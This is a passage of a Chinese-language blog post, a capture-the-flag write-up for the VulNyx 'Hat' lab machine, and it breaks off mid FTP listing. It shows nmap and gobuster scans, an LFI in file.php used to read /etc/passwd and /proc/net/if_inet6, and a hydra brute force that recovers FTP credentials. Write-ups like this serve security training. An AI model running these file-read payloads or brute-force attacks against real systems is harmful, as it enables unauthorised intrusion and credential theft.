@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机来源： https:&#x2F;&#x2F;vulnyx.com&#x2F;  难度：Medium 思维导图：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vlx_Hat">
+<meta property="og:url" content="http://miao-sec.github.io/Vulnyx/Vlx-Hat/index.html">
+<meta property="og:site_name" content="Miao Blog">
+<meta property="og:description" content="靶机来源： https:&#x2F;&#x2F;vulnyx.com&#x2F;  难度：Medium 思维导图：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603261531850.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603261138816.png">
+<meta property="article:published_time" content="2026-03-26T07:32:24.000Z">
+<meta property="article:modified_time" content="2026-03-26T07:35:23.648Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="文件包含LFI">
+<meta property="article:tag" content="Hydra">
+<meta property="article:tag" content="Fuzz">
+<meta property="article:tag" content="IPv6">
+<meta property="article:tag" content="Pyftpdlib">
+<meta property="article:tag" content="RSAcarck">
+<meta property="article:tag" content="Sudo_Nmap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603261531850.png">
+  
+  
+  
+  <title>Vlx_Hat - Miao Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":"flase"},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Vlx_Hat"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-26 15:32" pubdate>
+          2026年3月26日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Vlx_Hat</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>靶机来源： <a target="_blank" rel="noopener" href="https://vulnyx.com/">https://vulnyx.com/</a> </p>
+<p>难度：Medium</p>
+<p>思维导图： <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603261531850.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<span id="more"></span>
+
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 09:53 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00079s latency).<br>MAC Address: 0A:00:27:00:00:06 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00052s latency).<br>MAC Address: 08:00:27:AE:E2:AB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.0011s latency).<br>MAC Address: 08:00:27:85:A9:33 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 7.64 seconds<br>靶机IP：`192.168.2.8`<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.8                    <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 09:54 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00045s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT      STATE    SERVICE<br>22/tcp    filtered ssh<br>80/tcp    open     http<br>65535/tcp open     unknown<br>MAC Address: 08:00:27:85:A9:33 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.16 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放端口：<code>80、65535</code> <code>22</code>端口处于过滤状态</p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap --min-rate 10000 -sT -sC -sV -O -p22,80,65535 192.168.2.8<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 09:54 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.00074s latency).<br><br>PORT      STATE    SERVICE VERSION<br>22/tcp    filtered ssh<br>80/tcp    open     http    Apache httpd 2.4.38 ((Debian))<br>|_http-server-header: Apache/2.4.38 (Debian)<br>|_http-title: Apache2 Debian Default Page: It works<br>65535/tcp open     ftp     pyftpdlib 1.5.4<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|  Connected to: 192.168.2.8:65535<br>|  Waiting <span class="hljs-keyword">for</span> username.<br>|  TYPE: ASCII; STRUcture: File; MODE: Stream<br>|  Data connection closed.<br>|_End of status.<br>MAC Address: 08:00:27:85:A9:33 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose|router<br>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3<br>OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.80 seconds<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.8                          <br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 09:55 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.8<br>Host is up (0.0011s latency).<br>All 100 scanned ports on 192.168.2.8 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 53 closed udp ports (port-unreach), 47 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:85:A9:33 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 53.72 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，是Apache的默认页面</p>
+<h2 id="2、目录扫描"><a href="#2、目录扫描" class="headerlink" title="2、目录扫描"></a>2、目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,bak<br>...<br>logs                 (Status: 301) [Size: 309] [--&gt; http://192.168.2.8/logs/]<br>php-scripts          (Status: 301) [Size: 316] [--&gt; http://192.168.2.8/php-scripts/]<br>...<br></code></pre></td></tr></table></figure>
+
+<p>找到两个目录：<code>/logs、/php-scripts</code>，尝试访问无任何东西</p>
+<h3 id="1-logs"><a href="#1-logs" class="headerlink" title="1.logs"></a>1.logs</h3><p>尝试再对目录<code>/logs</code>进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.8/logs/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x <span class="hljs-built_in">log</span>   <br><br>vsftpd.log           (Status: 200) [Size: 1760]<br></code></pre></td></tr></table></figure>
+
+<p>查看<code>vsftpd.log</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# curl http://192.168.2.8/logs/vsftpd.log                                                                                 <br><br>[I 2021-09-28 18:43:57] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=475 &lt;&lt;&lt;<br>[I 2021-09-28 18:43:57] concurrency model: async<br>[I 2021-09-28 18:43:57] masquerade (NAT) address: None<br>[I 2021-09-28 18:43:57] passive ports: None<br>[I 2021-09-28 18:44:02] 192.168.1.83:49268-[] FTP session opened (connect)<br>[I 2021-09-28 18:44:06] 192.168.1.83:49280-[] USER <span class="hljs-string">&#x27;l4nr3n&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49290-[] USER <span class="hljs-string">&#x27;softyhack&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49292-[] USER <span class="hljs-string">&#x27;h4ckb1tu5&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49272-[] USER <span class="hljs-string">&#x27;noname&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49278-[] USER <span class="hljs-string">&#x27;cromiphi&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49284-[] USER <span class="hljs-string">&#x27;b4el7d&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49270-[] USER <span class="hljs-string">&#x27;shelldredd&#x27;</span> failed login.<br>[I 2021-09-28 18:44:06] 192.168.1.83:49270-[] USER <span class="hljs-string">&#x27;anonymous&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49292-[] USER <span class="hljs-string">&#x27;alienum&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49280-[] USER <span class="hljs-string">&#x27;k1m3r4&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49284-[] USER <span class="hljs-string">&#x27;tatayoyo&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49278-[] USER <span class="hljs-string">&#x27;Exploiter&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49268-[] USER <span class="hljs-string">&#x27;tasiyanci&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49274-[] USER <span class="hljs-string">&#x27;luken&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49270-[] USER <span class="hljs-string">&#x27;ch4rm&#x27;</span> failed login.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49282-[] FTP session closed (disconnect).<br>[I 2021-09-28 18:44:09] 192.168.1.83:49280-[admin_ftp] USER <span class="hljs-string">&#x27;admin_ftp&#x27;</span> logged <span class="hljs-keyword">in</span>.<br>[I 2021-09-28 18:44:09] 192.168.1.83:49280-[admin_ftp] FTP session closed (disconnect).<br>[I 2021-09-28 18:44:12] 192.168.1.83:49272-[] FTP session closed (disconnect).<br></code></pre></td></tr></table></figure>
+
+<p>找到FTP的登录用户名是<code>admin_ftp</code></p>
+<h3 id="2-php-scripts"><a href="#2-php-scripts" class="headerlink" title="2.php-scripts"></a>2.php-scripts</h3><p>再对目录<code>/php-scripts</code>进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.8/php-scripts/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php   <br><br>file.php             (Status: 200) [Size: 0]<br></code></pre></td></tr></table></figure>
+
+<p>访问<code>file.php</code>，是一个空白页面 <img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202603261138816.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload alt="img"></p>
+<h1 id="三、文件包含LFI"><a href="#三、文件包含LFI" class="headerlink" title="三、文件包含LFI"></a>三、文件包含LFI</h1><p>尝试对<code>file.php</code>的参数进行模糊测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ffuf -u http://192.168.2.8/php-scripts/file.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt  -fs 20  -ac <br><br>6                       [Status: 200, Size: 1404, Words: 13, Lines: 27, Duration: 9ms]<br></code></pre></td></tr></table></figure>
+
+<p>找到一个参数<code>6</code></p>
+<h3 id="1-获取用户名"><a href="#1-获取用户名" class="headerlink" title="1.获取用户名"></a>1.获取用户名</h3><p>读取<code>/etc/passwd</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# curl http://192.168.2.8/php-scripts/file.php?6=/etc/passwd<br><br>root:x:0:0:root:/root:/bin/bash<br>cromiphi:x:1000:1000:cromiphi,,,:/home/cromiphi:/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>找到用户<code>cromiphi</code></p>
+<h3 id="2-获取IPv6地址"><a href="#2-获取IPv6地址" class="headerlink" title="2.获取IPv6地址"></a>2.获取IPv6地址</h3><p>由于端口 22 处于过滤状态，因此查看文件 <code>/proc/net/if_inet6</code> 来获取 IPv6 地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# curl http://192.168.2.8/php-scripts/file.php?6=/proc/net/if_inet6<br>fe800000000000000a0027fffe85a933 02 40 20 80   enp0s3<br>00000000000000000000000000000001 01 80 10 80       lo<br></code></pre></td></tr></table></figure>
+
+<p>正确的处理一下IPv6的格式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# curl -sX GET <span class="hljs-string">&quot;http://192.168.2.8/php-scripts/file.php?6=/proc/net/if_inet6&quot;</span> |awk <span class="hljs-string">&#x27;NR==1 &#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">fold</span> -w4 | <span class="hljs-built_in">paste</span> -sd <span class="hljs-string">&quot;:&quot;</span><br>fe80:0000:0000:0000:0a00:27ff:fe85:a933<br></code></pre></td></tr></table></figure>
+
+<p>得到IPv6的地址：<code>fe80:0000:0000:0000:0a00:27ff:fe85:a933</code></p>
+<p>使用<code>nmap</code>扫描一下IPv6开放的端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# nmap -6 -p- fe80:0000:0000:0000:0a00:27ff:fe85:a933%eth1<br>Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 14:55 +0800<br>Nmap scan report <span class="hljs-keyword">for</span> fe80::a00:27ff:fe85:a933<br>Host is up (0.00040s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:85:A9:33 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.71 secondss<br></code></pre></td></tr></table></figure>
+
+<p>发现开放着22和80端口</p>
+<h1 id="四、Ftp-pyftpdlib"><a href="#四、Ftp-pyftpdlib" class="headerlink" title="四、Ftp-pyftpdlib"></a>四、Ftp-pyftpdlib</h1><p>端口65535开放的服务是<code>pyftpdlib</code> <code>pyftpdlib 1.5.4</code> 是一个用 Python 编写的 <strong>FTP 服务器库</strong>，它允许你快速搭建一个功能完整的 <strong>FTP（File Transfer Protocol）服务</strong>，和<code>ftp</code>服务一样</p>
+<p>使用ftp的进行连接，需要密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ftp 192.168.2.8 65535<br>Connected to 192.168.2.8.<br>220 pyftpdlib 1.5.4 ready.<br>Name (192.168.2.8:root): admin_ftp<br>331 Username ok, send password.<br>Password: <br>530 Authentication failed.<br>ftp: Login failed<br>ftp&gt; <br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>hydra</code>对ftp服务的密码进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# hydra -t 4 -l admin_ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.8:65535<br><br>[65535][ftp] host: 192.168.2.8   login: admin_ftp   password: cowboy<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-26 11:41:16<br></code></pre></td></tr></table></figure>
+
+<p>成功获取到凭证：<code>admin_ftp:cowboy</code></p>
+<p>登录ftp服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/miaosec]<br>└─# ftp 192.168.2.8 65535<br>Connected to 192.168.2.8.<br>220 pyftpdlib 1.5.4 ready.<br>Name (192.168.2.8:root): admin_ftp<br>331 Username ok, send password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">ls</span> <br>229 Entering extended passive mode (|||34371|).<br>125 Data connection already open. Transfer starting.<br>drwxrwxrwx   2 cromiphi cromiphi     4096 Sep 28  2021 share<br>226 Transfer 